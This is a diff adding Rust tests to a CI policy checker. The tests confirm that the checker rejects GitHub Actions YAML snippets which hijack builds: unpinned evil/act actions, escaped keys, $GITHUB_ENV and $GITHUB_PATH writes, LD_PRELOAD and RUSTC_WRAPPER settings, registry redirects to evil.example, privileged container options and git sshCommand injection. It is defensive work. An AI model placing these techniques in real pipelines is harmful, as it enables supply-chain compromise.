+        "---\n  jobs:\n    a:\n      steps:\n        - uses: evil/act@main\n".to_owned(),
+        "--- # c\n  jobs: {}\n".to_owned(),
+        "%YAML 1.2\n---\njobs: {}\n".to_owned(),
+        "jobs: {}\n...\n  more: x\n".to_owned(),
+        // A plain scalar continued on deeper lines.
+        "jobs:\n  a:\n    if: github.event_name == 'push'\n      && !cancelled()\n".to_owned(),
+        // A decoy in a block scalar cannot stand in for a hidden key.
+        format!(
+            "jobs:\n  a:\n    steps:\n      - run: |\n          uses: {checkout}\n      - \"u\\x73es\": evil/act@main\n"
+        ),
+    ] {
+        let text = snippet(&rejected);
+        let mut violations = yaml_subset_violations("t.yml", &text);
+        violations.extend(parser_violations("t.yml", &text));
+        violations.extend(allowlist_violations("t.yml", &text));
+        assert!(!violations.is_empty(), "accepted: {text:?}");
+    }
+    for accepted in [
+        format!("jobs:\n  a:\n    steps:\n      - uses: {checkout}\n        with:\n          persist-credentials: false\n      - {{uses: actions/checkout@SHA, with: {{persist-credentials: false}}}} # v7.0.1\n      - run: |\n          uses: x\n"),
+        "---\njobs:\n  a:\n    if: >-\n      github.event_name == 'push'\n      && !cancelled()\n...\n".to_owned(),
+    ] {
+        let text = snippet(&accepted);
+        assert_clean(&yaml_subset_violations("t.yml", &text));
+        assert_clean(&parser_violations("t.yml", &text));
+    }
+}
+
+#[test]
+fn the_tree_rules_read_checkouts_and_permissions_as_yaml_does() {
+    for rejected in [
+        // X1 (a): a name that spells the setting.
+        "steps:\n  - name: \"x, persist-credentials: false\"\n    uses: actions/checkout@SHA # v7.0.1\n",
+        // X1 (b): the setting in block-scalar text.
+        "steps:\n  - uses: actions/checkout@SHA # v7.0.1\n    with:\n      fetch-depth: 0\n  - run: |\n      persist-credentials: false\n",
+        // X1 (c): one flow line, two steps, one setting.
+        "steps: [{uses: actions/checkout@SHA, with: {persist-credentials: false}}, {uses: Actions/Checkout@SHA}]\n",
+        "steps:\n  - uses: actions/checkout@SHA # v7.0.1\n    with:\n      persist-credentials: \"true\"\n",
+        // X1 (d): a quoted `#` hiding a write scope.
+        "permissions: {a: '#', contents: write}\n",
+        "permissions: write-all\n",
+        "jobs:\n  a:\n    permissions:\n      checks: write\n",
+    ] {
+        let text = snippet(rejected);
+        assert!(
+            !tree_violations("t.yml", &text, false).is_empty(),
+            "accepted: {text}"
+        );
+    }
+    let release = "permissions: {}\njobs:\n  a:\n    permissions:\n      contents: read\n      packages: write\n      id-token: write\n";
+    assert_clean(&tree_violations("release.yml", release, true));
+    assert!(!tree_violations("ci.yml", release, false).is_empty());
+}
+
+/// The merged reading of the template (every branch at once) refuses these
+/// injections too. It is not the guarantee: a line can be `run: |` text in
+/// one render and a step in another, which only the rendered gate in
+/// forge-cli (`a_branch_cannot_hide_a_step_from_the_rendered_gate`) reads.
+#[test]
+fn the_template_is_read_in_every_branch() {
+    let template = read(APP_CI_TEMPLATE);
+    let point = "%%if postgresql%%\n      - run: cargo test";
+    assert!(template.contains(point), "the mutation point moved");
+    // R1: a `%%...%%` marker line must not hide the steps below it.
+    for injected in [
+        "      - \"u\\x73es\": taiki-e/install-action@main\n",
+        "      - !!str uses: evil/act@main\n",
+        "      - uses: evil/act@main\n",
+    ] {
+        let mutated = template.replacen(
+            point,
+            &format!("%%if postgresql%%\n{injected}      - run: cargo test"),
+            1,
+        );
+        let text = blank_template_markers(&mutated);
+        let mut violations = yaml_subset_violations("ci.yml.tmpl", &text);
+        violations.extend(parser_violations("ci.yml.tmpl", &text));
+        violations.extend(allowlist_violations("ci.yml.tmpl", &text));
+        assert!(!violations.is_empty(), "accepted: {injected}");
+    }
+}
+
+/// R1 (round 6): a YAML escape in a double-quoted scalar spells text the
+/// text rules never read (`"c\x61rgo install"` is `cargo install`), so no
+/// double-quoted scalar, key or value, holds a backslash.
+#[test]
+fn the_yaml_subset_refuses_escapes_in_double_quoted_values() {
+    for rejected in [
+        "steps:\n  - run: \"c\\x61rgo install evil-tool --git https://evil.example/x\"\n",
+        "steps:\n  - run: \"echo CARGO_\\x48OME=/tmp/h >> $GITHUB_\\x45NV\"\n",
+        "steps: [{run: \"c\\u0061rgo install x\"}]\n",
+        "env:\n  A: \"\\\"quoted\\\"\"\n",
+        "\"u\\x73es\": evil/act@main\n",
+    ] {
+        assert!(
+            !yaml_subset_violations("t.yml", rejected).is_empty(),
+            "accepted: {rejected}"
+        );
+    }
+    for accepted in [
+        // Plain and single-quoted scalars and block text have no escapes.
+        "steps:\n  - run: scripts/fuzz.sh -r \"^${TARGET}\\$\"\n",
+        "steps:\n  - run: 'echo \\x61'\n",
+        "steps:\n  - run: |\n      printf \"a\\n\"\n",
+        "env:\n  A: \"no escape\"\n",
+    ] {
+        assert_clean(&yaml_subset_violations("t.yml", accepted));
+    }
+}
+
+/// F4: a reader that takes a key's first value and one that takes its last
+/// would disagree, so no mapping repeats a key, in any case.
+#[test]
+fn the_parser_refuses_duplicate_keys_in_any_case() {
+    for rejected in [
+        "steps:\n  - uses: actions/checkout@SHA # v7.0.1\n    with:\n      persist-credentials: false\n      Persist-Credentials: true\n",
+        "steps:\n  - uses: actions/checkout@SHA # v7.0.1\n    USES: evil/act@main\n",
+        "permissions:\n  contents: read\npermissions:\n  contents: write\n",
+        "jobs:\n  a:\n    env: {A: x, a: y}\n",
+    ] {
+        let text = snippet(rejected);
+        let error = parse_yaml(&text).err().unwrap_or_default();
+        assert!(error.contains("appears twice"), "accepted: {text}");
+        assert!(
+            !tree_violations("t.yml", &text, false).is_empty(),
+            "the tree rules accepted: {text}"
+        );
+        assert!(
+            !parser_violations("t.yml", &text).is_empty(),
+            "the parser check accepted: {text}"
+        );
+    }
+    // The same key in two different mappings is fine.
+    let accepted = "jobs:\n  a:\n    env: {A: x}\n  b:\n    env: {A: y}\n";
+    assert!(parse_yaml(accepted).is_ok());
+}
+
+/// No gated file sets a variable that redirects where cargo or rustup fetch
+/// from, or writes `$GITHUB_ENV`.
+#[test]
+fn gated_files_set_no_redirecting_environment() {
+    for (name, text) in gated_files() {
+        assert_clean(&environment_violations(&name, &text));
+    }
+}
+
+/// D8: every gated file sets only listed variables, writes runner files and
+/// uses expression functions only on listed lines, and selects no toolchain
+/// or flag outside the lists; every list entry is still in use.
+#[test]
+fn gated_files_stay_inside_the_closed_allowlists() {
+    let files = gated_files();
+    for (name, text) in &files {
+        assert_clean(&closed_list_violations(name, text));
+    }
+    for (file, line) in RUNNER_FILE_LINES.iter().chain(EXPRESSION_LINES.iter()) {
+        assert!(
+            files
+                .iter()
+                .any(|(name, text)| name == file && text.lines().any(|own| own.trim() == *line)),
+            "{file}: the listed line is no longer used: {line}"
+        );
+    }
+}
+
+/// Round-7 repros (A to E and the expression notes), each refused by the
+/// closed allowlists.
+#[test]
+fn the_closed_allowlists_refuse_every_redirect() {
+    for rejected in [
+        // A: runner files, PATH and shell startup variables.
+        "steps:\n  - run: echo /tmp/evil >> \"$GITHUB_PATH\"\n",
+        "steps:\n  - run: echo /tmp/evil | tee -a \"${GITHUB_PATH}\"\n",
+        "steps:\n  - run: echo x=1 > $GITHUB_OUTPUT\n",
+        "env:\n  PATH: /tmp/evil:/usr/bin\n",
+        "steps:\n  - run: PATH=/tmp/evil:$PATH cargo build\n",
+        "env:\n  BASH_ENV: ./ci/env.sh\n",
+        "env:\n  ENV: ./ci/env.sh\n",
+        "env:\n  LD_PRELOAD: /tmp/evil.so\n",
+        "env:\n  LD_LIBRARY_PATH: /tmp/evil\n",
+        // B: rustup and toolchain selection, compiler flags.
+        "env:\n  RUSTUP_HOME: /tmp/rustup\n",
+        "env:\n  RUSTUP_TOOLCHAIN: /opt/evil-toolchain\n",
+        "steps:\n  - run: cargo +/opt/evil-toolchain build\n",
+        "steps:\n  - run: rustc +nightly --version\n",
+        "steps:\n  - run: rustup toolchain link evil /opt/evil\n",
+        "steps:\n  - run: rustup override set /opt/evil\n",
+        "steps:\n  - run: rustup set profile complete\n",
+        "env:\n  RUSTFLAGS: -C linker=/tmp/evil\n",
+        "env:\n  CARGO_ENCODED_RUSTFLAGS: -Clink-arg=-fuse-ld=/tmp/evil\n",
+        "env:\n  RUSTDOCFLAGS: --test-runtool /tmp/evil\n",
+        "env:\n  RUSTC_BOOTSTRAP: \"1\"\n",
+        "steps:\n  - run: cargo build -Zbuild-std\n",
+        "steps:\n  - run: cargo build --config 'target.x.linker=\"/tmp/evil\"'\n",
+        "env:\n  CARGO_TARGET_X86_64_UNKNOWN_LINUX_GNU_LINKER: /tmp/evil\n",
+        "env:\n  CARGO_BUILD_RUSTC: /tmp/evil\n",
+        // E: HOME in every assignment form.
+        "steps:\n  - run: HOME+=/x cargo build\n",
+        "steps:\n  - run: read HOME < /tmp/h\n",
+        "steps:\n  - run: for HOME in /tmp/h; do cargo build; done\n",
+        "steps:\n  - run: printf -v HOME /tmp/h\n",
+        "steps:\n  - run: echo ${HOME:=/tmp/h}\n",
+        "steps:\n  - run: export HOME\n",
+        "steps:\n  - run: declare -x HOME=/tmp/h\n",
+        "steps:\n  - run: local -r HOME\n",
+        "steps:\n  - run: readonly HOME\n",
+        "steps:\n  - run: typeset HOME\n",
+        "steps:\n  - run: mapfile HOME < f\n",
+        "steps:\n  - run: select HOME in a b; do :; done\n",
+        "steps:\n  - run: exec {HOME}>/tmp/h\n",
+        "steps:\n  - run: ((HOME = 1))\n",
+        "steps:\n  - run: env HOME=/tmp/h cargo build\n",
+        // Expressions that build names or structure, whole-expression env:
+        // and with:, and other shells.
+        "env:\n  A: ${{ format('CARGO_{0}', 'HOME') }}\n",
+        "jobs:\n  a:\n    env: ${{ fromJSON(vars.ENV) }}\n",
+        "steps:\n  - uses: actions/cache@SHA # v6.1.0\n    with: ${{ fromJSON(vars.WITH) }}\n",
+        "steps:\n  - run: echo ${{ join(github.event.commits.*.message, ' ') }}\n",
+        "steps:\n  - run: echo '${{ toJSON(github) }}'\n",
+        "steps:\n  - run: echo x\n    shell: bash --rcfile /tmp/evil {0}\n",
+        // Allowlisted actions asked for `latest` or an unpinned image.
+        "steps:\n  - uses: actions/setup-go@SHA # v6.0.0\n    with:\n      go-version: stable\n",
+        "steps:\n  - uses: actions/setup-go@SHA # v6.0.0\n    with:\n      go-version-file: go.mod\n      check-latest: true\n",
+        "steps:\n  - uses: golangci/golangci-lint-action@SHA # v9.0.0\n    with:\n      version: latest\n",
+        "steps:\n  - uses: golangci/golangci-lint-action@SHA # v9.0.0\n",
+        "steps:\n  - uses: sigstore/cosign-installer@SHA # v4.1.2\n    with:\n      cosign-release: latest\n",
+        "steps:\n  - uses: docker/setup-buildx-action@SHA # v4.4.1\n    with:\n      version: latest\n",
+        "steps:\n  - uses: docker/setup-buildx-action@SHA # v4.4.1\n    with:\n      driver-opts: image=moby/buildkit:master\n",
+        // Round 8, lead 1: continuations. An assignment target split from
+        // its `=`, a runner-file write split across lines, a listed line
+        // continued into more.
+        "steps:\n  - run: |\n      HOME\\\n      =/tmp/h cargo build\n",
+        "steps:\n  - run: |\n      export HO\\\n      ME=/tmp/h\n",
+        "steps:\n  - run: |\n      echo /tmp/evil >> \"$GITHUB_\\\n      PATH\"\n",
+        "steps:\n  - run: |\n      echo \"$HOME/.forge-tools/$TOOL-$VERSION/bin\" >> \"$GITHUB_PATH\" \\\n        && export HOME=/tmp/h\n",
+        "steps:\n  - run: |\n      true \\\n      echo \"$HOME/.forge-tools/$TOOL-$VERSION/bin\" >> \"$GITHUB_PATH\"\n",
+        // Lead 2: runner files named in a heredoc or a `$( )`.
+        "steps:\n  - run: |\n      cat <<EOF >> \"$GITHUB_ENV\"\n      A=1\n      EOF\n",
+        "steps:\n  - run: |\n      cat <<EOF\n      $GITHUB_OUTPUT\n      EOF\n",
+        "steps:\n  - run: |\n      f=\"$(\n      echo $GITHUB_PATH)\"\n",
+        // Lead 3: container and service options, keys and ports.
+        "jobs:\n  a:\n    services:\n      db:\n        image: x@sha256:DIGEST\n        options: -e CARGO_HOME=/tmp/h\n",
+        "jobs:\n  a:\n    services:\n      db:\n        image: x@sha256:DIGEST\n        options: --env=A=1\n",
+        "jobs:\n  a:\n    services:\n      db:\n        image: x@sha256:DIGEST\n        options: --env-file /tmp/e\n",
+        "jobs:\n  a:\n    services:\n      db:\n        image: x@sha256:DIGEST\n        options: -v /:/host\n",
+        "jobs:\n  a:\n    services:\n      db:\n        image: x@sha256:DIGEST\n        options: --volume=/:/host\n",
+        "jobs:\n  a:\n    services:\n      db:\n        image: x@sha256:DIGEST\n        options: --mount type=bind,src=/,dst=/h\n",
+        "jobs:\n  a:\n    services:\n      db:\n        image: x@sha256:DIGEST\n        options: --entrypoint /bin/sh\n",
+        "jobs:\n  a:\n    services:\n      db:\n        image: x@sha256:DIGEST\n        options: --privileged\n",
+        "jobs:\n  a:\n    services:\n      db:\n        image: x@sha256:DIGEST\n        options: --network host\n",
+        "jobs:\n  a:\n    container:\n      image: x@sha256:DIGEST\n      options: --cap-add SYS_ADMIN\n",
+        "jobs:\n  a:\n    services:\n      db:\n        image: x@sha256:DIGEST\n        options: --health-cmd \"true\"\n",
+        "jobs:\n  a:\n    services:\n      db:\n        image: x@sha256:DIGEST\n        volumes:\n          - /:/host\n",
+        "jobs:\n  a:\n    container:\n      image: x@sha256:DIGEST\n      credentials:\n        username: u\n",
+        "jobs:\n  a:\n    services:\n      db:\n        image: x@sha256:DIGEST\n        entrypoint: /bin/sh\n",
+        "jobs:\n  a:\n    services:\n      db:\n        image: x@sha256:DIGEST\n        ports:\n          - 0.0.0.0:5432:5432\n",
+        "jobs:\n  a:\n    container:\n      image: x@sha256:DIGEST\n      env:\n        HOME: /tmp/h\n",
+        // Git configuration from the environment.
+        "env:\n  GIT_CONFIG_COUNT: \"1\"\n",
+        "env:\n  GIT_CONFIG_KEY_0: url.https://evil.example/.insteadOf\n",
+        "env:\n  GIT_CONFIG_VALUE_0: https://github.com/\n",
+        "steps:\n  - run: GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.sshCommand GIT_CONFIG_VALUE_0=/tmp/evil git fetch\n",
+    ] {
+        let text = snippet(rejected);
+        assert!(parse_yaml(&text).is_ok(), "the snippet must parse: {text}");
+        assert!(
+            !closed_list_violations("t.yml", &text).is_empty(),
+            "accepted: {text}"
+        );
+    }
+}
+
+/// Round 8: a listed runner-file line passes only as a complete logical
+/// line, and the listed container options pass.
+#[test]
+fn listed_lines_and_options_pass_only_whole() {
+    let action = ".github/actions/cargo-tool/action.yml";
+    let listed = "runs:\n  steps:\n    - shell: bash\n      run: echo \"$HOME/.forge-tools/$TOOL-$VERSION/bin\" >> \"$GITHUB_PATH\"\n      env:\n        TOOL: t\n        VERSION: v\n";
+    assert_clean(&closed_list_violations(action, listed));
+    let continued = "runs:\n  steps:\n    - shell: bash\n      run: >-\n        echo \"$HOME/.forge-tools/$TOOL-$VERSION/bin\" >> \"$GITHUB_PATH\"\n        \\\n        /tmp/evil\n";
+    assert!(!closed_list_violations(action, continued).is_empty());
+    for options in ALLOWED_CONTAINER_OPTIONS {
+        let text = format!(
+            "jobs:\n  a:\n    services:\n      db:\n        image: x@sha256:{DIGEST}\n        env:\n          POSTGRES_PASSWORD: forge\n        ports:\n          - 5432:5432\n        options: >-\n          {options}\n"
+        );
+        assert_clean(&closed_list_violations("ci.yml", &text));
+    }
+}
+
+/// D8: an unlisted name is refused in every position that sets it.
+#[test]
+fn an_unlisted_variable_is_refused_wherever_it_is_set() {
+    for rejected in [
+        "env:\n  UNLISTED: x\n",
+        "jobs:\n  a:\n    env:\n      UNLISTED: x\n",
+        "steps:\n  - run: x\n    env:\n      UNLISTED: x\n",
+        "env: {UNLISTED: x}\n",
+        "env:\n  \"UNLISTED\": x\n",
+        "env:\n  'UNLISTED': x\n",
+        "jobs:\n  a:\n    container:\n      image: x@sha256:DIGEST\n      env:\n        UNLISTED: x\n",
+        "jobs:\n  a:\n    services:\n      db:\n        image: x@sha256:DIGEST\n        env:\n          UNLISTED: x\n",
+        // A listed name with a value other than its fixed one.
+        "env:\n  CARGO_INCREMENTAL: \"1\"\n",
+        "steps:\n  - run: CARGO_TERM_COLOR=never cargo build\n",
+        "steps:\n  - run: UNLISTED=x cargo build\n",
+        "steps:\n  - run: UNLISTED+=x\n",
+        "steps:\n  - run: arr[0]=x; UNLISTED[1]=x\n",
+        "steps:\n  - run: export UNLISTED=x\n",
+        "steps:\n  - run: export UNLISTED\n",
+        "steps:\n  - run: env UNLISTED=x make\n",
+        "steps:\n  - run: sudo UNLISTED=x make\n",
+        "steps:\n  - run: declare UNLISTED\n",
+        "steps:\n  - run: typeset UNLISTED\n",
+        "steps:\n  - run: readonly UNLISTED=x\n",
+        "steps:\n  - run: local UNLISTED\n",
+        "steps:\n  - run: read -r UNLISTED\n",
+        "steps:\n  - run: for UNLISTED in a; do :; done\n",
+        "steps:\n  - run: printf -v UNLISTED x\n",
+        "steps:\n  - run: printf -vUNLISTED x\n",
+        "steps:\n  - run: echo \"${UNLISTED:=x}\"\n",
+        "steps:\n  - run: echo \"${UNLISTED=x}\"\n",
+        "steps:\n  - run: let UNLISTED=1\n",
+        "steps:\n  - run: ((UNLISTED++))\n",
+        "steps:\n  - run: ((++UNLISTED))\n",
+        "steps:\n  - run: (( UNLISTED += 1 ))\n",
+        "steps:\n  - run: getopts ab UNLISTED\n",
+        "steps:\n  - run: coproc UNLISTED { cat; }\n",
+        "steps:\n  - run: |\n      cargo build \\\n        && UNLISTED=x make\n",
+    ] {
+        let text = snippet(rejected);
+        assert!(parse_yaml(&text).is_ok(), "the snippet must parse: {text}");
+        assert!(
+            closed_list_violations("t.yml", &text)
+                .iter()
+                .any(|violation| violation.contains("UNLISTED") || violation.contains("CARGO_")),
+            "accepted: {text}"
+        );
+    }
+    for accepted in [
+        "env:\n  CARGO_TERM_COLOR: always\n  FORGE_TEST_DATABASE_URL: postgres://x\n",
+        "steps:\n  - run: echo \"$HOME/bin\" \"${HOME}\" \"${HOME:-/root}\"\n",
+        "steps:\n  - run: '[ \"$status\" = healthy ] && test \"$(date)\" = 0'\n",
+        "steps:\n  - run: cargo test --locked -- --include-ignored\n",
+        "steps:\n  - run: rustup component add llvm-tools-preview\n",
+        "steps:\n  - run: docker inspect --format '{{.State.Health.Status}}' app\n",
+    ] {
+        assert_clean(&closed_list_violations("t.yml", &snippet(accepted)));
+    }
+}
+
+/// D8: no tool configuration file exists anywhere in the repository,
+/// templates included (a `.tmpl` suffix is ignored).
+#[test]
+fn no_tool_configuration_exists_in_the_repository() {
+    let skipped = [root().join("target"), root().join(".git")];
+    let found = tool_configuration_files(&root(), &skipped);
+    assert!(found.is_empty(), "tool configuration found: {found:?}");
+    let scratch = tempfile::tempdir().expect("tempdir");
+    for (relative, content) in [
+        ("a/.cargo/config.toml", ""),
+        ("b/.cargo/config", ""),
+        (
+            "c/rust-toolchain.toml",
+            "[toolchain]\npath = \"/opt/evil\"\n",
+        ),
+        ("c2/rust-toolchain", "[toolchain]\n  path= \"/opt/evil\"\n"),
+        // Round 8, lead 4: every other spelling rustup reads, and any
+        // content that is not listed.
+        (
+            "c3/rust-toolchain.toml",
+            "[toolchain]\n\"path\" = '/opt/evil'\n",
+        ),
+        (
+            "c4/rust-toolchain.toml",
+            "toolchain = { path = \"/opt/evil\" }\n",
+        ),
+        ("c5/rust-toolchain", "/opt/evil\n"),
+        ("c6/rust-toolchain", "nightly-2026-01-01\n"),
+        (
+            "c7/rust-toolchain.toml",
+            "[toolchain]\nchannel = \"1.98.1\"\n",
+        ),
+        ("ok/rust-toolchain.toml", ALLOWED_TOOLCHAIN_FILES[1]),
+        ("d/go.work", "go 1.25\n"),
+        ("d/go.work.sum", ""),
+        ("e/go.env", ""),
+        ("f/.ci/go/env", "GOPROXY=https://evil.example\n"),
+        ("g/.bashrc", ""),
+        ("g/.profile", ""),
+        ("g/.bash_profile", ""),
+        ("g/.envrc", ""),
+        ("templates/go.work.tmpl", ""),
+        ("templates/.cargo/config.toml.tmpl", ""),
+        ("target/.cargo/config.toml", ""),
+    ] {
+        let path = scratch.path().join(relative);
+        fs::create_dir_all(path.parent().expect("parent")).expect("mkdir");
+        fs::write(&path, content).expect("write");
+    }
+    let found: Vec<String> =
+        tool_configuration_files(scratch.path(), &[scratch.path().join("target")])
+            .iter()
+            .map(|path| {
+                path.strip_prefix(scratch.path())
+                    .expect("inside")
+                    .to_string_lossy()
+                    .into_owned()
+            })
+            .collect();
+    assert_eq!(
+        found,
+        [
+            "a/.cargo/config.toml",
+            "b/.cargo/config",
+            "c/rust-toolchain.toml",
+            "c2/rust-toolchain",
+            "c3/rust-toolchain.toml",
+            "c4/rust-toolchain.toml",
+            "c5/rust-toolchain",
+            "c6/rust-toolchain",
+            "c7/rust-toolchain.toml",
+            "d/go.work",
+            "d/go.work.sum",
+            "e/go.env",
+            "f/.ci/go/env",
+            "g/.bash_profile",
+            "g/.bashrc",
+            "g/.envrc",
+            "g/.profile",
+            "templates/.cargo/config.toml.tmpl",
+            "templates/go.work.tmpl",
+        ]
+    );
+}
+
+/// F3: every redirecting variable is refused in an env: block at any level,
+/// in any case, and in run text; a `$GITHUB_ENV` write is refused whatever
+/// it sets.
+#[test]
+fn the_environment_rule_rejects_redirecting_variables() {
+    for rejected in [
+        "env:\n  CARGO_HOME: /tmp/ci-home\n",
+        "jobs:\n  a:\n    env:\n      cargo_home: /tmp/ci-home\n",
+        "steps:\n  - run: cargo build\n    env:\n      CARGO_REGISTRIES_MIRROR_INDEX: sparse+https://evil.example/\n",
+        "env: {CARGO_REGISTRY_DEFAULT: mirror}\n",
+        "env:\n  CARGO_SOURCE_CRATES_IO_REPLACE_WITH: mirror\n",
+        "env:\n  CARGO_INSTALL_ROOT: /tmp/bin\n",
+        "env:\n  CARGO_NET_GIT_FETCH_WITH_CLI: \"true\"\n",
+        "env:\n  RUSTUP_DIST_SERVER: https://evil.example\n",
+        "env:\n  RUSTUP_UPDATE_ROOT: https://evil.example/rustup\n",
+        "steps:\n  - run: export CARGO_HOME=/tmp/ci-home\n",
+        "steps:\n  - run: echo \"CARGO_REGISTRIES_X_INDEX=https://evil.example\" >> \"$GITHUB_ENV\"\n",
+        "steps:\n  - run: echo \"A=b\" >> $GITHUB_ENV\n",
+        "steps:\n  - run: |\n      printf '%s\\n' \"X=1\" >> \"${GITHUB_ENV}\"\n",
+        // Round 6: HTTP settings, the dist root, compiler wrappers, build and
+        // target settings, the configuration directory, HOME and RUSTC set
+        // (not read), cargo configuration files and flags, and the
+        // deprecated workflow commands with their switch.
+        "env:\n  CARGO_HTTP_PROXY: http://evil.example:3128\n",
+        "env:\n  CARGO_HTTP_CAINFO: /tmp/evil-ca.pem\n",
+        "env:\n  RUSTUP_DIST_ROOT: https://evil.example/dist\n",
+        "env:\n  RUSTC_WRAPPER: /tmp/wrap\n",
+        "env:\n  RUSTC_WORKSPACE_WRAPPER: /tmp/wrap\n",
+        "env:\n  CARGO_BUILD_RUSTC_WRAPPER: /tmp/wrap\n",
+        "env:\n  CARGO_TARGET_X86_64_UNKNOWN_LINUX_GNU_RUNNER: /tmp/run\n",
+        "env:\n  XDG_CONFIG_HOME: /tmp/ci\n",
+        "env:\n  HOME: /tmp/ci\n",
+        "env: {\"HOME\": /tmp/ci}\n",
+        "env:\n  RUSTC: /tmp/rustc\n",
+        "steps:\n  - run: HOME=\"$PWD/.ci\" cargo build\n",
+        "steps:\n  - run: env RUSTC=/tmp/rustc cargo build\n",
+        "steps:\n  - run: cp ci/config.toml .cargo/config.toml\n",
+        "steps:\n  - run: mkdir -p x/cargo && cp c x/cargo/config\n",
+        "steps:\n  - run: cargo build --config 'source.crates-io.replace-with=\"m\"'\n",
+        "steps:\n  - run: cargo build --config=net.offline=true\n",
+        "env:\n  ACTIONS_ALLOW_UNSECURE_COMMANDS: \"true\"\n",
+        "steps:\n  - run: echo \"::set-env name=CARGO_X::y\"\n",
+        "steps:\n  - run: echo '::add-path::/tmp/bin'\n",
+    ] {
+        let text = snippet(rejected);
+        // Round 7 (D8): the build and target prefixes and cargo's --config
+        // moved from the denylist to the closed allowlists.
+        let mut violations = environment_violations("t.yml", &text);
+        violations.extend(closed_list_violations("t.yml", &text));
+        assert!(!violations.is_empty(), "accepted: {text}");
+    }
+    for accepted in [
+        "env:\n  CARGO_TERM_COLOR: always\n  RUSTFLAGS: -D warnings\n",
+        "env:\n  FORGE_CARGO_HOMEPAGE: x\n",
+        "steps:\n  - run: echo \"$HOME/bin\" >> \"$GITHUB_PATH\"\n",
+        "steps:\n  - run: rustc --version && ls \"${HOME}\" ~/.cargo/bin\n",
+        "steps:\n  - run: cargo install tool --root \"$HOME/.forge-tools\"\n",
+    ] {
+        assert_clean(&environment_violations("t.yml", &snippet(accepted)));
+    }
+}
+
 #[test]
 fn workflow_containers_are_pinned_by_digest() {
     for (name, relative) in workflows_and_local_actions() {
@@ -956,12 +992,14 @@ fn dockerfile_bases(text: &str) -> Vec<String> {
 #[test]
 fn generated_application_ci_and_dockerfile_are_pinned() {
     let name = "templates/app/github/workflows/ci.yml.tmpl";
-    let ci = read("crates/forge-cli/templates/app/github/workflows/ci.yml.tmpl");
+    let ci = blank_template_markers(&read(APP_CI_TEMPLATE));
     assert_clean(&pin_violations(name, &ci));
     assert_clean(&checkout_violations(name, &ci));
     assert_clean(&container_violations(name, &ci));
     assert_clean(&permission_violations(name, &ci, false));
     assert_clean(&secret_violations(name, &ci, false));
+    assert_clean(&allowlist_violations(name, &ci));
+    assert_clean(&tool_install_violations(name, &ci));
     assert!(
         ci.contains("FORGE_TEST_DATABASE_URL") && ci.contains("--include-ignored"),
         "{name}: a PostgreSQL application's CI runs its database tests"
@@ -1267,6 +1305,19 @@ fn the_tool_rule_rejects_installs_that_ignore_a_version_bump() {
         "        run: $CARGO install x --version 1.2.3 --locked\n",
         "        run: ${CARGO:-cargo} install x --version 1.2.3 --locked\n",
         "        run: CARGO_ALIAS_I=install cargo i x\n",
+        "        run: c=cargo; $c install x --version 1.2.3 --locked\n",
+        "        run: ${c} install x\n",
+        "        run: \"$c\" install x\n",
+        "        run: cargo $'\\x69nstall' x\n",
+        // A `#` inside shell quotes is no comment; a continuation inside a
+        // word joins without a space.
+        "        run: |\n          echo \" #\"; cargo install evil\n",
+        "        run: echo \"a #\" && cargo install evil\n",
+        "        run: |\n          c\\\n          argo install evil\n",
+        "        run: |\n          cargo inst\\\n          all evil\n",
+        "        run: ca\"rgo\" install x --version 1.2.3 --locked\n",
+        "        run: c\\\\argo inst\\\\all x --version 1.2.3 --locked\n",
+        "        run: cargo 'bin'stall x\n",
         "        env:\n          CARGO_ALIAS_GET: install\n",
     ] {
         assert!(
@@ -1304,6 +1355,11 @@ fn the_tool_rule_rejects_installs_that_ignore_a_version_bump() {
         "cargo -q install cargo-auditable --version 0.7.7 --locked",
         "true || cargo install cargo-auditable --version 0.7.7 --locked",
         "cargo install cargo-auditable --version 0.7.7 --locked --git https://example.com/a",
+        "cargo install cargo-auditable --version 0.7.7 --locked --g\\\\it https://example.com/a",
+        "cargo install cargo-auditable --version 0.7.7 --locked \\\"--registry\\\" mirror",
+        "cargo install cargo-auditable cargo-fuzz --version 0.7.7 --locked",
+        "cargo install cargo-fuzz --version 0.13.2 --locked",
+        "cargo install --version 0.7.7 --locked",
     ] {
         assert!(
             !tool_install_violations(release, &step(run)).is_empty(),
@@ -1318,6 +1374,17 @@ fn the_tool_rule_rejects_installs_that_ignore_a_version_bump() {
     // checked $VERSION.
     let action = "      run: cargo install \"$TOOL\" --version \"$VERSION\" --locked --root \"$HOME/.forge-tools/$TOOL-$VERSION\"\n";
     assert_clean(&tool_install_violations(TOOL_ACTION, action));
+    // ... spelled exactly so: unquoted or partly quoted is refused.
+    for spelled in [
+        "      run: cargo install \"$TOOL\" --version $VERSION --locked\n",
+        "      run: cargo install \"$TOOL\" --version $VER\"SION\" --locked\n",
+        "      run: cargo install \"$TOOL\" --version=\"$VERSION\" --locked\n",
+    ] {
+        assert!(
+            !tool_install_violations(TOOL_ACTION, spelled).is_empty(),
+            "accepted: {spelled}"
+        );
+    }
     for elsewhere in [
         ".github/workflows/ci.yml",
         "evil/.github/actions/cargo-tool/action.yml",
@@ -1328,6 +1395,78 @@ fn the_tool_rule_rejects_installs_that_ignore_a_version_bump() {
             "{elsewhere}"
         );
     }
+}
+
+/// Every `.cargo/config` or `.cargo/config.toml` in `directory` or below
+/// it, following symbolic links to them (a linked `.cargo` counts). The
+/// walk does not enter `skipped` (the root's build output and git
+/// metadata) nor symbolic links to directories.
+fn cargo_configs(directory: &Path, skipped: &[PathBuf]) -> Vec<PathBuf> {
+    let mut found: Vec<PathBuf> = ["config", "config.toml"]
+        .iter()
+        .map(|file| directory.join(".cargo").join(file))
+        .filter(|path| path.exists())
+        .collect();
+    let Ok(entries) = fs::read_dir(directory) else {
+        return found;
+    };
+    for entry in entries.filter_map(Result::ok) {
+        let path = entry.path();
+        let is_directory = entry.file_type().is_ok_and(|kind| kind.is_dir());
+        if is_directory && !skipped.contains(&path) {
+            found.extend(cargo_configs(&path, skipped));
+        }
+    }
+    found
+}
+
+/// No cargo configuration exists anywhere in the repository: cargo reads
+/// every parent directory's `.cargo/config*`, and one could redirect crate
+/// sources (`[source]`, `replace-with`, `[registries]`) or alias `install`
+/// past the locked, crates.io-only installs the rules check. A future need
+/// goes through review and changes this test.
+#[test]
+fn no_cargo_configuration_exists_in_the_repository() {
+    let skipped = [root().join("target"), root().join(".git")];
+    let found = cargo_configs(&root(), &skipped);
+    assert!(found.is_empty(), "cargo configuration found: {found:?}");
+    let scratch = tempfile::tempdir().expect("tempdir");
+    for (relative, content) in [
+        ("a/.cargo/config.toml", "alias = { i = \"install\" }\n"),
+        (
